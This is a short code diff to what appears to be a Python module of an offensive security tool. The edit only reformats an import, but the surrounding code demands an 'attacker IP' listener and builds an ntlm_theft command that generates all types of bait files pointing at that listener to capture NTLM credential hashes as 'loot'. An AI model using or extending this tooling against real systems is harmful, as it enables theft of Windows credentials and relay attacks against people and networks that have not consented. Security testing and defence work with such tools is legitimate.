@@ -23,7 +23,8 @@ def run(args: Any) -> int:
         print("[!] --relay-target or --listener required (attacker IP)")
         return 1
 
-    import subprocess, shutil
+    import subprocess
+    import shutil
     ntlm_theft = shutil.which("ntlm_theft") or shutil.which("ntlm_theft.py")
     if ntlm_theft:
         cmd = [ntlm_theft, "-g", "all", "-s", listener, "-f", "loot"]
